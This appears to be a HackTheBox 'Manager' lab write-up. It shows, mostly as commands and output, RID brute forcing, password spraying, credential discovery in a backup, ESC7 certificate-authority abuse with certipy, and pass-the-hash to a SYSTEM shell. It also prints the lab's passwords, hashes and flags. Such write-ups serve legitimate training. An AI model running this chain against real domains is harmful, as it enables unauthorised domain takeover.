# HackTheBox Manager

A CTF lab machine of the HackTheBox platform at Medium level running Windows OS, where we will bruteforce RID usernames on a domain controller, exploit password spray, find working creds in a backup, elevate privileges by issuing a certificate on a domain controller for which we will write a TGT and extract a hash for the Pass The Hash attack.

## Service Overview

The machine is assigned the IP address 10.10.11.236. Let's perform a scan using Nmap:

```bash
$ nmap -sT -sC -Pn -oN nmap 10.10.11.236
Stats: 0:00:42 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 98.20% done; ETC: 16:39 (0:00:01 remaining)
Nmap scan report for 10.10.11.236
Host is up (0.065s latency).
Not shown: 987 filtered tcp ports (no-response)
PORT     STATE SERVICE
53/tcp   open  domain
80/tcp   open  http
|_http-title: Manager
| http-methods:
|_  Potentially risky methods: TRACE
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
|_ssl-date: 2023-10-24T20:39:45+00:00; +7h00m01s from scanner time.
| ssl-cert: Subject: commonName=dc01.manager.htb
| Subject Alternative Name: othername:<unsupported>, DNS:dc01.manager.htb
| Not valid before: 2023-07-30T13:51:28
|_Not valid after:  2024-07-29T13:51:28
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
| ssl-cert: Subject: commonName=dc01.manager.htb
| Subject Alternative Name: othername:<unsupported>, DNS:dc01.manager.htb
| Not valid before: 2023-07-30T13:51:28
|_Not valid after:  2024-07-29T13:51:28
|_ssl-date: 2023-10-24T20:39:08+00:00; +7h00m00s from scanner time.
1433/tcp open  ms-sql-s
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2023-10-24T20:02:07
|_Not valid after:  2053-10-24T20:02:07
|_ms-sql-info: ERROR: Script execution failed (use -d to debug)
|_ms-sql-ntlm-info: ERROR: Script execution failed (use -d to debug)
|_ssl-date: 2023-10-24T20:39:42+00:00; +7h00m01s from scanner time.
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl
| ssl-cert: Subject: commonName=dc01.manager.htb
| Subject Alternative Name: othername:<unsupported>, DNS:dc01.manager.htb
| Not valid before: 2023-07-30T13:51:28
|_Not valid after:  2024-07-29T13:51:28
|_ssl-date: 2023-10-24T20:39:08+00:00; +7h00m00s from scanner time.

Host script results:
| smb2-security-mode:
|   311:
|_    Message signing enabled and required
| smb2-time:
|   date: 2023-10-24T20:39:08
|_  start_date: N/A
|_clock-skew: mean: 7h00m00s, deviation: 0s, median: 7h00m00s

Nmap done: 1 IP address (1 host up) scanned in 47.32 seconds
```

Add our domains to **```/etc/hosts```**:

```bash
$ sudo nano /etc/hosts

10.10.11.236 manager.htb dc01.manager.htb
```

## Web-service

Didn't find anything interesting on the web service, we'll come back here later.

## Domain Controller

Let's try to brute force users with rid-brute and crackmapexec:

```bash
$ pip3 install crackmapexec
$ crackmapexec smb manager.htb -u anonymous -p "" --rid-brute
[*] First time use detected
[*] Creating home directory structure
[*] Creating default workspace
[*] Initializing LDAP protocol database
[*] Initializing MSSQL protocol database
[*] Initializing SMB protocol database
[*] Initializing SSH protocol database
[*] Initializing WINRM protocol database
[*] Copying default configuration file
[*] Generating SSL certificate
/usr/lib/python3/dist-packages/paramiko/transport.py:219: CryptographyDeprecationWarning: Blowfish has been deprecated
  "class": algorithms.Blowfish,
SMB         manager.htb     445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)
SMB         manager.htb     445    DC01             [+] manager.htb\anonymous:
SMB         manager.htb     445    DC01             [+] Brute forcing RIDs
SMB         manager.htb     445    DC01             498: MANAGER\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         manager.htb     445    DC01             500: MANAGER\Administrator (SidTypeUser)
SMB         manager.htb     445    DC01             501: MANAGER\Guest (SidTypeUser)
SMB         manager.htb     445    DC01             502: MANAGER\krbtgt (SidTypeUser)
SMB         manager.htb     445    DC01             512: MANAGER\Domain Admins (SidTypeGroup)
SMB         manager.htb     445    DC01             513: MANAGER\Domain Users (SidTypeGroup)
SMB         manager.htb     445    DC01             514: MANAGER\Domain Guests (SidTypeGroup)
SMB         manager.htb     445    DC01             515: MANAGER\Domain Computers (SidTypeGroup)
SMB         manager.htb     445    DC01             516: MANAGER\Domain Controllers (SidTypeGroup)
SMB         manager.htb     445    DC01             517: MANAGER\Cert Publishers (SidTypeAlias)
SMB         manager.htb     445    DC01             518: MANAGER\Schema Admins (SidTypeGroup)
SMB         manager.htb     445    DC01             519: MANAGER\Enterprise Admins (SidTypeGroup)
SMB         manager.htb     445    DC01             520: MANAGER\Group Policy Creator Owners (SidTypeGroup)
SMB         manager.htb     445    DC01             521: MANAGER\Read-only Domain Controllers (SidTypeGroup)
SMB         manager.htb     445    DC01             522: MANAGER\Cloneable Domain Controllers (SidTypeGroup)
SMB         manager.htb     445    DC01             525: MANAGER\Protected Users (SidTypeGroup)
SMB         manager.htb     445    DC01             526: MANAGER\Key Admins (SidTypeGroup)
SMB         manager.htb     445    DC01             527: MANAGER\Enterprise Key Admins (SidTypeGroup)
SMB         manager.htb     445    DC01             553: MANAGER\RAS and IAS Servers (SidTypeAlias)
SMB         manager.htb     445    DC01             571: MANAGER\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         manager.htb     445    DC01             572: MANAGER\Denied RODC Password Replication Group (SidTypeAlias)
SMB         manager.htb     445    DC01             1000: MANAGER\DC01$ (SidTypeUser)
SMB         manager.htb     445    DC01             1101: MANAGER\DnsAdmins (SidTypeAlias)
SMB         manager.htb     445    DC01             1102: MANAGER\DnsUpdateProxy (SidTypeGroup)
SMB         manager.htb     445    DC01             1103: MANAGER\SQLServer2005SQLBrowserUser$DC01 (SidTypeAlias)
SMB         manager.htb     445    DC01             1113: MANAGER\Zhong (SidTypeUser)
SMB         manager.htb     445    DC01             1114: MANAGER\Cheng (SidTypeUser)
SMB         manager.htb     445    DC01             1115: MANAGER\Ryan (SidTypeUser)
SMB         manager.htb     445    DC01             1116: MANAGER\Raven (SidTypeUser)
SMB         manager.htb     445    DC01             1117: MANAGER\JinWoo (SidTypeUser)
SMB         manager.htb     445    DC01             1118: MANAGER\ChinHae (SidTypeUser)
SMB         manager.htb     445    DC01             1119: MANAGER\Operator (SidTypeUser)
```

From here we find the users (written to the users.txt file):

```text
Zhong
Cheng
Ryan
Raven
JinWoo
ChinHae
Operator
```

Let's convert the list of users to lower case and write the result to the passwords.txt file.

Let's start going through the passwords:

```bash
$ crackmapexec smb manager.htb -u users.txt -p passwords.txt
/usr/lib/python3/dist-packages/paramiko/transport.py:219: CryptographyDeprecationWarning: Blowfish has been deprecated
  "class": algorithms.Blowfish,
SMB         manager.htb     445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)
SMB         manager.htb     445    DC01             [-] manager.htb\Zhong:passwords.txt STATUS_LOGON_FAILURE
SMB         manager.htb     445    DC01             [-] manager.htb\Cheng:passwords.txt STATUS_LOGON_FAILURE
SMB         manager.htb     445    DC01             [-] manager.htb\Ryan:passwords.txt STATUS_LOGON_FAILURE
SMB         manager.htb     445    DC01             [-] manager.htb\Raven:passwords.txt STATUS_LOGON_FAILURE
SMB         manager.htb     445    DC01             [-] manager.htb\JinWoo:passwords.txt STATUS_LOGON_FAILURE
SMB         manager.htb     445    DC01             [-] manager.htb\ChinHae:passwords.txt STATUS_LOGON_FAILURE
SMB         manager.htb     445    DC01             [-] manager.htb\Operator:passwords.txt STATUS_LOGON_FAILURE
SMB         manager.htb     445    DC01             [+] manager.htb\Operator:operator
```

This is how we find the password for the Operator account: **Operator:operator**.

## MSSQL

The Operator user has access to MSSQL.

```bash
nano /usr/local/lib/python3.9/dist-packages/impacket/tds.py
             # Switching to TLS now
-            ctx = SSL.Context(SSL.TLSv1_METHOD)
+            ctx = SSL.Context(SSL.TLSv1_2_METHOD)
             ctx.set_cipher_list('RC4, AES256')
             tls = SSL.Connection(ctx,None)
             tls.set_connect_state()
+
             while True:
                 try:
                     tls.do_handshake()
@@ -908,7 +909,7 @@ class MSSQL:
             LOG.info("Encryption required, switching to TLS")

             # Switching to TLS now
-            ctx = SSL.Context(SSL.TLSv1_METHOD)
+            ctx = SSL.Context(SSL.TLSv1_2_METHOD)
             ctx.set_cipher_list('RC4, AES256')
             tls = SSL.Connection(ctx,None)
```

```sql
$ impacket-mssqlclient -p 1433 -dc-ip 10.10.11.236 manager.htb/Operator:operator@10.10.11.236 -windows-auth
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(DC01\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208)
[!] Press help for extra shell commands
SQL>
```

Find an interesting backup file in the root of the web server.

```sql
SQL (MANAGER\Operator  guest@master)> xp_dirtree "C:\inetpub\wwwroot\",0,1;
subdirectory                      depth   file   
-------------------------------   -----   ----   
...  
website-backup-27-07-23-old.zip       1      1
```

Download and unzip this file. In the **```.old-conf.xml```** file we will find the creds for the raven user:

```bash
$ unzip website-backup-27-07-23-old.zip
Archive:  website-backup-27-07-23-old.zip
  inflating: .old-conf.xml
  inflating: about.html
  inflating: contact.html
  inflating: css/bootstrap.css
  inflating: css/responsive.css
  inflating: css/style.css
  inflating: css/style.css.map
  inflating: css/style.scss
  inflating: images/about-img.png
  inflating: images/body_bg.jpg
 extracting: images/call.png
 extracting: images/call-o.png
  inflating: images/client.jpg
  inflating: images/contact-img.jpg
 extracting: images/envelope.png
 extracting: images/envelope-o.png
  inflating: images/hero-bg.jpg
 extracting: images/location.png
 extracting: images/location-o.png
 extracting: images/logo.png
  inflating: images/menu.png
 extracting: images/next.png
 extracting: images/next-white.png
  inflating: images/offer-img.jpg
  inflating: images/prev.png
 extracting: images/prev-white.png
 extracting: images/quote.png
 extracting: images/s-1.png
 extracting: images/s-2.png
 extracting: images/s-3.png
 extracting: images/s-4.png
 extracting: images/search-icon.png
  inflating: index.html
  inflating: js/bootstrap.js
  inflating: js/jquery-3.4.1.min.js
  inflating: service.html

$ cat .old-conf.xml
<?xml version="1.0" encoding="UTF-8"?>
<ldap-conf xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
   <server>
      <host>dc01.manager.htb</host>
      <open-port enabled="true">389</open-port>
      <secure-port enabled="false">0</secure-port>
      <search-base>dc=manager,dc=htb</search-base>
      <server-type>microsoft</server-type>
      <access-user>
         <user>raven@manager.htb</user>
         <password>R4v3nBe5tD3veloP3r!123</password>
      </access-user>
      <uid-attribute>cn</uid-attribute>
   </server>
   <search type="full">
      <dir-list>
         <dir>cn=Operator1,CN=users,dc=manager,dc=htb</dir>
      </dir-list>
   </search>
</ldap-conf>
```

## Privilege escalation

Verify certificates and the rights to issue them using certipy:

```bash
$ pip3 install certipy-ad

$ certipy find -u raven@manager.htb -p R4v3nBe5tD3veloP3r\!123 -dc-ip 10.10.11.236
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Trying to get CA configuration for 'manager-DC01-CA' via CSRA
[*] Got CA configuration for 'manager-DC01-CA'
[*] Saved BloodHound data to '20231024175135_Certipy.zip'. Drag and drop the file into the BloodHound GUI from @ly4k
[*] Saved text output to '20231024175135_Certipy.txt'
[*] Saved JSON output to '20231024175135_Certipy.json'
```

We detect a potential privilege escalation through an attack by ESC7 and the user Raven.

```bash
$ cat 20231024175135_Certipy.txt
Certificate Authorities
  0
    CA Name                             : manager-DC01-CA
    DNS Name                            : dc01.manager.htb
    Certificate Subject                 : CN=manager-DC01-CA, DC=manager, DC=htb
    Certificate Serial Number           : 5150CE6EC048749448C7390A52F264BB
    Certificate Validity Start          : 2023-07-27 10:21:05+00:00
    Certificate Validity End            : 2122-07-27 10:31:04+00:00
    Web Enrollment                      : Disabled
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Permissions
      Owner                             : MANAGER.HTB\Administrators
      Access Rights
        Enroll                          : MANAGER.HTB\Operator
                                          MANAGER.HTB\Authenticated Users
                                          MANAGER.HTB\Raven
        ManageCertificates              : MANAGER.HTB\Administrators
                                          MANAGER.HTB\Domain Admins
                                          MANAGER.HTB\Enterprise Admins
        ManageCa                        : MANAGER.HTB\Administrators
                                          MANAGER.HTB\Domain Admins
                                          MANAGER.HTB\Enterprise Admins
                                          MANAGER.HTB\Raven
    [!] Vulnerabilities
      ESC7                              : 'MANAGER.HTB\\Raven' has dangerous permissions
...
```

Synchronize the time with the domain controller:

```bash
$ apt-get install rdate
$ rdate -n manager.htb 
```

We're attacking by the manual:

```bash
$ sudo rdate -n manager.htb
Wed Oct 25 00:53:27 EEST 2023

$ certipy ca -ca 'manager-DC01-CA' -add-officer raven -username raven@manager.htb -password R4v3nBe5tD3veloP3r\!123 -dc-ip 10.10.11.236
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'Raven' on 'manager-DC01-CA'

$ sudo rdate -n manager.htb
Wed Oct 25 01:12:16 EEST 2023

$ certipy ca -ca 'manager-DC01-CA' -username raven@manager.htb -password R4v3nBe5tD3veloP3r\!123 -dc-ip 10.10.11.236 -enable-template 'SubCA'
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'manager-DC01-CA'

$ sudo rdate -n manager.htb
Wed Oct 25 01:12:29 EEST 2023

$ certipy req -username raven@manager.htb -password R4v3nBe5tD3veloP3r\!123 -ca 'manager-DC01-CA' -target 10.10.11.236 -template SubCA -upn administrator@manager.htb
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 13
Would you like to save the private key? (y/N) y
[*] Saved private key to 13.key
[-] Failed to request certificate

$ sudo rdate -n manager.htb
Wed Oct 25 01:12:36 EEST 2023

$ certipy ca -ca 'manager-DC01-CA' -issue-request 13 -username raven@manager.htb -password R4v3nBe5tD3veloP3r\!123
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate

$ sudo rdate -n manager.htb
Wed Oct 25 01:13:12 EEST 2023

$ certipy req -username raven@manager.htb -password R4v3nBe5tD3veloP3r\!123 -ca 'manager-DC01-CA' -target 10.10.11.236 -retrieve 13
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 13
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@manager.htb'
[*] Certificate has no object SID
[*] Loaded private key from '13.key'
[*] Saved certificate and private key to 'administrator.pfx'
```

Now we get the TGT and pull the hash for it:

```bash
$ certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'manager.htb' -dc-ip 10.10.11.236
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@manager.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@manager.htb': aad3b435b51404eeaad3b435b51404ee:ae5064c2f62317332c88629e025924ef
```

Use psexec to log in as administrator with Pass-The-Hash:

```bash
$ psexec.py manager.htb/administrator@manager.htb -hashes aad3b435b51404eeaad3b435b51404ee:ae5064c2f62317332c88629e025924ef -dc-ip 10.10.11.236
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Requesting shares on manager.htb.....
[*] Found writable share ADMIN$
[*] Uploading file hAwLukvn.exe
[*] Opening SVCManager on manager.htb.....
[*] Creating service CQoi on manager.htb.....
[*] Starting service CQoi.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.4974]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> cd C:\Users\Raven\Desktop
C:\Users\Raven\Desktop> type user.txt
b197ecd669113ba7677b2676390cb182
C:\Windows\system32> cd C:\Users\Administrator\Desktop
C:\Users\Administrator\Desktop> type root.txt
4bc6326adf6b32cbc89219d51a149886
```